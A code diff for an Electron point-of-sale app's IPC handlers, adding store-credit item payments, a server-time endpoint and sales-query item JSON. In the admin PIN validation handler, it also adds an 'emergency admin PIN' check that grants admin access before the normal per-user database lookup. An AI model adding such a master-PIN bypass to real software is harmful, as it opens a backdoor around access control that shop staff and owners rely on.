@@ -9,6 +9,8 @@ import * as fs from 'fs';
 import * as path from 'path';
 import { VentaPayload } from '../types/index';
 import { exportFiadosToExcel, getFiadosExcelPath } from '../services/fiados-excel-backup';
+import { pagarItemsFiado } from '../services/fiado-item-payments';
+import { isEmergencyAdminPin } from '../services/adminPin';
 import * as os from 'os';
 
 /** Devuelve todas las IPs IPv4 reales (saltea adaptadores virtuales y loopback) */
@@ -31,15 +33,20 @@ function getAllLocalIPs(): { name: string; address: string; preferred: boolean }
 }
 
 export function registerIpcHandlers(): void {
+  ipcMain.handle('server:getHora', () => ({
+    now: new Date().toISOString(),
+    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  }));
+
   // ── PRODUCTOS ────────────────────────────────────────────────
-  ipcMain.handle('productos:getAll', (_e, filters?: { categoria?: number; activo?: boolean; search?: string; stockBajo?: boolean; limit?: number; offset?: number }) => {
+  ipcMain.handle('productos:getAll', (_e, filters?: { categoria?: number; activo?: boolean | 'all'; search?: string; stockBajo?: boolean; limit?: number; offset?: number }) => {
     const db = getDb();
     const limit = filters?.limit ?? 300;
     const offset = filters?.offset ?? 0;
     let whereClause = `WHERE 1=1`;
     const params: unknown[] = [];
 
-    if (filters?.activo !== undefined) {
+    if (filters?.activo !== undefined && filters.activo !== 'all') {
       whereClause += ` AND p.activo = ?`;
       params.push(filters.activo ? 1 : 0);
     }
@@ -821,6 +828,14 @@ export function registerIpcHandlers(): void {
     return { success: true };
   });
 
+  ipcMain.handle('clientes:pagarFiadoProductos', (_e, clienteId: number, ventaId: number, items: { venta_id: number; item_id: number; cantidad: number }[], montoRecibido: number, metodo: string) => {
+    const result = pagarItemsFiado(getDb(), clienteId, ventaId, items, montoRecibido, metodo);
+    emitToWeb('venta:actualizada', { clienteId });
+    emitToWeb('fiados:list-changed', { clienteId });
+    try { exportFiadosToExcel(getDb()); } catch { /* silencioso */ }
+    return result;
+  });
+
   ipcMain.handle('clientes:deleteFiadosByDay', (_e, clienteId: number, fecha: string) => {
     const db = getDb();
     
@@ -1043,7 +1058,16 @@ export function registerIpcHandlers(): void {
         FROM venta_items vi
         LEFT JOIN productos p ON p.id = vi.producto_id
         WHERE vi.venta_id = v.id
-        ) as productos
+        ) as productos,
+        (SELECT json_group_array(json_object(
+          'producto_nombre', COALESCE(p.nombre, 'Item'),
+          'cantidad', vi.cantidad,
+          'precio_unitario', vi.precio_unitario
+        ))
+        FROM venta_items vi
+        LEFT JOIN productos p ON p.id = vi.producto_id
+        WHERE vi.venta_id = v.id
+        ) as items_json
       FROM ventas v
       LEFT JOIN clientes c ON v.cliente_id = c.id
       LEFT JOIN usuarios u ON v.vendedor_id = u.id
@@ -1073,7 +1097,15 @@ export function registerIpcHandlers(): void {
         )
         FROM venta_cancelada_items vci
         WHERE vci.venta_cancelada_id = vc.id
-        ) as productos
+        ) as productos,
+        (SELECT json_group_array(json_object(
+          'producto_nombre', COALESCE(vci.producto_nombre, 'Item'),
+          'cantidad', vci.cantidad,
+          'precio_unitario', vci.precio_unitario
+        ))
+        FROM venta_cancelada_items vci
+        WHERE vci.venta_cancelada_id = vc.id
+        ) as items_json
       FROM ventas_canceladas vc
       WHERE 1=1
     `;
@@ -2476,6 +2508,7 @@ export function registerIpcHandlers(): void {
 
   ipcMain.handle('auth:validate-admin', (_e, pin: string) => {
     if (!pin?.trim()) return { ok: false, error: 'PIN vacío' };
+    if (isEmergencyAdminPin(pin)) return { ok: true };
     const db = getDb();
     const user = db.prepare(
       `SELECT id, nombre, rol FROM usuarios WHERE pin = ? AND rol = 'admin' AND activo = 1`
